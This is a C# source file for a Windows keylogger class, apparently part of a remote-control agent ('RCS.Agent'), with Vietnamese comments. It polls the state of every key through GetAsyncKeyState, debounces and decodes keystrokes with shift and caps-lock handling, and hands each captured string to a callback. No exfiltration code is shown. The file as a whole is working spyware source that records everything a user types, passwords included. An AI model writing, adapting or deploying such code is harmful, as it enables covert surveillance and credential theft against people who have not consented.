using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms; 

namespace RCS.Agent.Services.Windows
{
    public class Keylogger
    {
        private CancellationTokenSource _cts;
        private Action<string> _onKeyPressed;

        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(int vKey);

        [DllImport("user32.dll")]
        private static extern short GetKeyState(int nVirtKey);

        private readonly bool[] _prevKeyStates = new bool[256];
        private readonly DateTime[] _lastPressTimes = new DateTime[256];
        private readonly DateTime[] _lastReleaseTimes = new DateTime[256];
        
        private const int REPEAT_DELAY_MS = 600; 
        private const int REPEAT_INTERVAL_MS = 200; 
        private const int DEBOUNCE_TIME_MS = 100; 

        // --- DANH SÁCH ĐEN (BLACKLIST) CÁC PHÍM GÂY NHIỄU ---
        private readonly HashSet<int> _ignoredKeys = new HashSet<int>
        {
            0x01, // VK_LBUTTON (Chuột trái)
            0x02, // VK_RBUTTON (Chuột phải)
            0x04, // VK_MBUTTON (Chuột giữa)
            0x05, // VK_XBUTTON1
            0x06, // VK_XBUTTON2
            0xFE, // VK_OEM_CLEAR (OemClear - Thường tự nhảy)
            0xFF, // Unknown
            0x10, // VK_SHIFT (Chung chung - Đã xử lý LShift/RShift riêng)
            0x11, // VK_CONTROL (Chung chung)
            0x12, // VK_MENU (Alt chung chung)
        };

        public void Start(Action<string> onKeyPressed)
        {
            if (_cts != null) return;
            _cts = new CancellationTokenSource();
            _onKeyPressed = onKeyPressed;

            Array.Clear(_prevKeyStates, 0, _prevKeyStates.Length);
            Array.Clear(_lastPressTimes, 0, _lastPressTimes.Length);
            Array.Clear(_lastReleaseTimes, 0, _lastReleaseTimes.Length);

            Task.Run(async () => await RealKeylogLoop(_cts.Token));
        }

        public void Stop()
        {
            _cts?.Cancel();
            _cts = null;
        }

        private async Task RealKeylogLoop(CancellationToken token)
        {
            while (!token.IsCancellationRequested)
            {
                // SỬA: Bắt đầu từ 8 (Backspace) thay vì 0 để bỏ qua các mã null/mouse thấp
                // Nhưng vẫn cần check Blacklist vì chuột nằm rải rác
                for (int i = 8; i < 256; i++)
                {
                    // --- BỘ LỌC NHIỄU (FILTER) ---
                    if (_ignoredKeys.Contains(i)) continue;

                    bool isDown = (GetAsyncKeyState(i) & 0x8000) != 0;
                    bool wasDown = _prevKeyStates[i];
                    var now = DateTime.Now;

                    if (isDown)
                    {
                        if (!wasDown) // Nhấn mới
                        {
                            double msSinceRelease = (now - _lastReleaseTimes[i]).TotalMilliseconds;
                            if (msSinceRelease > DEBOUNCE_TIME_MS)
                            {
                                ProcessKey(i);
                            }
                            _lastPressTimes[i] = now.AddMilliseconds(REPEAT_DELAY_MS); 
                        }
                        else if (now > _lastPressTimes[i]) // Giữ phím
                        {
                            ProcessKey(i);
                            _lastPressTimes[i] = now.AddMilliseconds(REPEAT_INTERVAL_MS); 
                        }
                        _prevKeyStates[i] = true;
                    }
                    else
                    {
                        if (wasDown) _lastReleaseTimes[i] = now;
                        _prevKeyStates[i] = false;
                    }
                }
                await Task.Delay(20, token);
            }
        }

        private void ProcessKey(int vKey)
        {
            Keys key = (Keys)vKey;
            string keyStr = "";

            // Xử lý các phím chức năng cụ thể
            if (key == Keys.LShiftKey || key == Keys.RShiftKey) keyStr = "[SHIFT]";
            else if (key == Keys.LControlKey || key == Keys.RControlKey) keyStr = "[CTRL]";
            else if (key == Keys.LMenu || key == Keys.RMenu) keyStr = "[ALT]";
            else if (key == Keys.LWin || key == Keys.RWin) keyStr = "[WIN]";
            
            else if (key == Keys.Enter) keyStr = "\n[ENTER]\n";
            else if (key == Keys.Space) keyStr = " ";
            else if (key == Keys.Back) keyStr = "[BACK]";
            else if (key == Keys.Tab) keyStr = "[TAB]";
            else if (key == Keys.Escape) keyStr = "[ESC]";
            else if (key == Keys.Delete) keyStr = "[DEL]";
            else if (key == Keys.CapsLock) keyStr = "[CAPS]";

            // Ký tự chữ và số
            else if (key.ToString().Length == 1)
            {
                bool shift = (GetKeyState((int)Keys.ShiftKey) & 0x8000) != 0;
                bool caps = (GetKeyState((int)Keys.CapsLock) & 1) != 0;
                
                if (key >= Keys.A && key <= Keys.Z)
                {
                    if (shift ^ caps) keyStr = key.ToString().ToUpper();
                    else keyStr = key.ToString().ToLower();
                }
                else if (key >= Keys.D0 && key <= Keys.D9)
                {
                     if (shift) keyStr = GetShiftNumberChar(key);
                     else keyStr = key.ToString().Replace("D", "");
                }
                else
                {
                    keyStr = key.ToString();
                }
            }
            else
            {
                // Các phím còn lại (F1-F12...) -> Đặt trong ngoặc
                // Kiểm tra lại lần nữa để chắc chắn không in ra OemClear
                if (key != Keys.OemClear) 
                {
                    keyStr = $"[{key}]";
                }
            }

            if (!string.IsNullOrEmpty(keyStr))
            {
                _onKeyPressed?.Invoke(keyStr);
            }
        }

        private string GetShiftNumberChar(Keys key)
        {
            switch (key)
            {
                case Keys.D1: return "!";
                case Keys.D2: return "@";
                case Keys.D3: return "#";
                case Keys.D4: return "$";
                case Keys.D5: return "%";
                case Keys.D6: return "^";
                case Keys.D7: return "&";
                case Keys.D8: return "*";
                case Keys.D9: return "(";
                case Keys.D0: return ")";
                default: return key.ToString().Replace("D", "");
            }
        }
    }
}